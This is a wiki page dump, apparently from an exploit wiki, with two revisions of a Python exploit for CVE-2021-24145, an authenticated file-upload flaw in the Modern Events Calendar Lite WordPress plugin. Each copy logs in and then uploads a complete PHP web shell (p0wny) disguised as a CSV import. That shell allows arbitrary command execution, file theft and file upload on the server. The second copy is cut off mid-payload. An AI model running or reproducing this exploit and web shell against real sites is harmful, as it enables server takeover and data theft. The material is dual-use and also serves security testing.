| |    \ \ / /|  _| _____ __) | | | |__) | |_____ __) | || |_| | || ||___ \ 
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____/ __/|__   _| |__   _|__) |
 \____|  \_/  |_____|   |_____|\___/_____|_|    |_____|  |_| |_|  |_||____/ 
                                
                * Wordpress Plugin Modern Events Calendar Lite RCE                                                        
                * @Hacker5preme
                    

"""
print(banner)

'''
Import required modules:
'''
import requests
import argparse

'''
User-Input:
'''
my_parser = argparse.ArgumentParser(description='Wordpress Plugin Modern Events Calenar Lite RCE (Authenticated)')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
my_parser.add_argument('-u', '--USERNAME', type=str)
my_parser.add_argument('-p', '--PASSWORD', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
wp_path = args.PATH
username = args.USERNAME
password = args.PASSWORD
print('')

'''
Authentication:
'''
session = requests.Session()
auth_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-login.php'

# Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

# Body:
body = {
    'log': username,
    'pwd': password,
    'wp-submit': 'Log In',
    'testcookie': '1'
}

# Authenticate:
print('')
auth = session.post(auth_url, headers=header, data=body)
auth_header = auth.headers['Set-Cookie']
if 'wordpress_logged_in' in auth_header:
    print('[+] Authentication successfull !')
else:
    print('[-] Authentication failed !')
    exit()


'''
Exploit:
'''
exploit_url = "http://" + target_ip + ':' + target_port + wp_path + "wp-admin/admin.php?page=MEC-ix&amp;tab=MEC-import"

# Exploit Header:
header = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "multipart/form-data; boundary=---------------------------29650037893637916779865254589",
    "Origin": "http://" + target_ip,
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1"
}

# Exploit Body: (using p0wny shell: https://github.com/flozz/p0wny-shell
body = "-----------------------------29650037893637916779865254589\r\nContent-Disposition: form-data; name=\"feed\"; filename=\"shell.php\"\r\nContent-Type: text/csv\r\n\r\n&lt;?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2&gt;&amp;1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2&gt;&amp;1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" =&gt; $stdout,\n        \"cwd\" =&gt; getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" =&gt; getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' =&gt; $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' =&gt; array('File not found / no read permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    } else {\n        return array(\n            'name' =&gt; basename($filePath),\n            'file' =&gt; base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' =&gt; array('Invalid path / no write permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' =&gt; array('Done.'),\n            'cwd' =&gt; getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2&gt;/', $cmd)) {\n                $cmd .= ' 2&gt;&amp;1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?&gt;&lt;!DOCTYPE html&gt;\n\n&lt;html&gt;\n\n    &lt;head&gt;\n        &lt;meta charset=\"UTF-8\" /&gt;\n        &lt;title&gt;p0wny@shell:~#&lt;/title&gt;\n        &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt;\n        &lt;style&gt;\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt &gt; span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input &gt; label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        &lt;/style&gt;\n\n        &lt;script&gt;\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '&lt;span class=\\\"shell-prompt\\\"&gt;' + genPrompt(CWD) + '&lt;/span&gt; ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -&gt; nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length &lt;= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length &gt; 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:&lt;span title=\\\"\" + cwd + \"\\\"&gt;\" + shortCwd + \"&lt;/span&gt;#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&amp;/g, \"&amp;\")\n                    .replace(/&lt;/g, \"&lt;\")\n                    .replace(/&gt;/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition &gt; 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition &gt;= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&amp;\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        &lt;/script&gt;\n    &lt;/head&gt;\n\n    &lt;body&gt;\n        &lt;div id=\"shell\"&gt;\n            &lt;pre id=\"shell-content\"&gt;\n                &lt;div id=\"shell-logo\"&gt;\n        ___                         ____      _          _ _        _  _   &lt;span&gt;&lt;/span&gt;\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ &lt;span&gt;&lt;/span&gt;\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|&lt;span&gt;&lt;/span&gt;\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|&lt;span&gt;&lt;/span&gt;\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  &lt;span&gt;&lt;/span&gt;\n|_|                         |___/  \\____/                                  &lt;span&gt;&lt;/span&gt;\n                &lt;/div&gt;\n            &lt;/pre&gt;\n            &lt;div id=\"shell-input\"&gt;\n                &lt;label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\"&gt;???&lt;/label&gt;\n                &lt;div&gt;\n                    &lt;input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n    &lt;/body&gt;\n\n&lt;/html&gt;\n\r\n-----------------------------29650037893637916779865254589\r\nContent-Disposition: form-data; name=\"mec-ix-action\"\r\n\r\nimport-start-bookings\r\n-----------------------------29650037893637916779865254589--\r\n"

# Exploit
session.post(exploit_url, headers=header, data=body)
print('')
print('[+] Shell Uploaded to: ' + 'http://' + target_ip + ':' + target_port + wp_path + '/wp-content/uploads/shell.php')
print('')
&lt;/pre&gt;</text>
      <sha1>ms5mwy7yeespjspq9dbzcclks9f41al</sha1>
    </revision>
    <revision>
      <id>6180</id>
      <parentid>6179</parentid>
      <timestamp>2021-07-03T01:58:51Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>6180</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="22161" sha1="bchreljauvfidqhlmoesovjwt1l0zj5" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
Version: Before 5.16.5


==EXP==
&lt;pre&gt;
# Exploit Title: Wordpress Plugin Modern Events Calendar 5.16.2 - Remote Code Execution (Authenticated)
# Date 01.07.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://webnus.net/modern-events-calendar/
# Software Link: https://downloads.wordpress.org/plugin/modern-events-calendar-lite.5.16.2.zip
# Version: Before 5.16.5
# Tested on: Ubuntu 18.04
# CVE: CVE-2021-24145
# CWE: CWE-434
# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24145/README.md

'''
Description:
Arbitrary file upload in the Modern Events Calendar Lite WordPress plugin, versions before 5.16.5,
did not properly check the imported file, allowing PHP ones to be uploaded by administrator by using the 'text/csv'
content-type in the request.
'''


'''
Banner:
'''
banner = """
  ______     _______     ____   ___ ____  _      ____  _  _   _ _  _  ____  
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |    |___ \| || | / | || || ___| 
| |    \ \ / /|  _| _____ __) | | | |__) | |_____ __) | || |_| | || ||___ \ 
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____/ __/|__   _| |__   _|__) |
 \____|  \_/  |_____|   |_____|\___/_____|_|    |_____|  |_| |_|  |_||____/ 
                                
                * Wordpress Plugin Modern Events Calendar Lite RCE                                                        
                * @Hacker5preme
                    

"""
print(banner)

'''
Import required modules:
'''
import requests
import argparse

'''
User-Input:
'''
my_parser = argparse.ArgumentParser(description='Wordpress Plugin Modern Events Calenar Lite RCE (Authenticated)')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
my_parser.add_argument('-u', '--USERNAME', type=str)
my_parser.add_argument('-p', '--PASSWORD', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
wp_path = args.PATH
username = args.USERNAME
password = args.PASSWORD
print('')

'''
Authentication:
'''
session = requests.Session()
auth_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-login.php'

# Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

# Body:
body = {
    'log': username,
    'pwd': password,
    'wp-submit': 'Log In',
    'testcookie': '1'
}

# Authenticate:
print('')
auth = session.post(auth_url, headers=header, data=body)
auth_header = auth.headers['Set-Cookie']
if 'wordpress_logged_in' in auth_header:
    print('[+] Authentication successfull !')
else:
    print('[-] Authentication failed !')
    exit()


'''
Exploit:
'''
exploit_url = "http://" + target_ip + ':' + target_port + wp_path + "wp-admin/admin.php?page=MEC-ix&amp;tab=MEC-import"

# Exploit Header:
header = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "multipart/form-data; boundary=---------------------------29650037893637916779865254589",
    "Origin": "http://" + target_ip,
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1"
}

# Exploit Body: (using p0wny shell: https://github.com/flozz/p0wny-shell
body = "-----------------------------29650037893637916779865254589\r\nContent-Disposition: form-data; name=\"feed\"; filename=\"shell.php\"\r\nContent-Type: text/csv\r\n\r\n&lt;?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2&gt;&amp;1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2&gt;&amp;1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" =&gt; $stdout,\n        \"cwd\" =&gt; getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" =&gt; getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' =&gt; $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' =&gt; array('File not found / no read permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    } else {\n        return array(\n            'name' =&gt; basename($filePath),\n            'file' =&gt; base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' =&gt; array('Invalid path / no write permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' =&gt; array('Done.'),\n            'cwd' =&gt; getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2&gt;/', $cmd)) {\n                $cmd .= ' 2&gt;&amp;1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?&gt;&lt;!DOCTYPE html&gt;\n\n&lt;html&gt;\n\n    &lt;head&gt;\n        &lt;meta charset=\"UTF-8\" /&gt;\n        &lt;title&gt;p0wny@shell:~#&lt;/title&gt;\n        &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt;\n        &lt;style&gt;\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt &gt; span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input &gt; label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        &lt;/style&gt;\n\n        &lt;script&gt;\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '&lt;span class=\\\"shell-prompt\\\"&gt;' + genPrompt(CWD) + '&lt;/span&gt; ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -&gt; nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length &lt;= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new 